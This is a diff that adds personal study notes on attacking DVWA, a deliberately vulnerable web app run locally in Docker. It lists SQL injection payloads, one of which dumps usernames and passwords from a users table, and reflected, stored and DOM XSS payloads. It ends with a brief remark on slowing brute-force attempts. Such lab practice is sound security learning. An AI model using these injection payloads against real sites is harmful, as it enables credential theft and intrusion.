@@ -1,0 +1,41 @@
+docker pull vulnerables/web-dvwa
+
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+then search into web browser 
+
+localhost/setup.php
+
+
+
+sql injections that work
+%' and 1=0 union select null, concat(user,':',password) from users #
+
+?id=a' UNION SELECT "text1","text2";-- -&Submit=Submit
+
+works when security is set to medium too on website
+?id=a UNION SELECT 1,2;-- -&Submit=Submit.
+
+
+works when security is set to high
+ID: a' UNION SELECT "text1","text2";-- -&Submit=Submit
+
+
+reflected xss i have working
+
+?name=<script>alert("XSS");</script>
+?name=<SCRIPT>alert("XSS");</SCRIPT>
+
+stored xss is much the same website has help tab
+
+DOM 
+requires you to change the address in the search bar for example
+
+localhost/vulnerabilities/xss_d/?default=English<script>alert(1)</script>
+instead of
+http://localhost/vulnerabilities/xss_d/?default=English
+not sure how to put that into a container yet
+
+
+brute force sql can be slowed down by adding a .sleep function between entries or stopped by adding a max attempt function
+
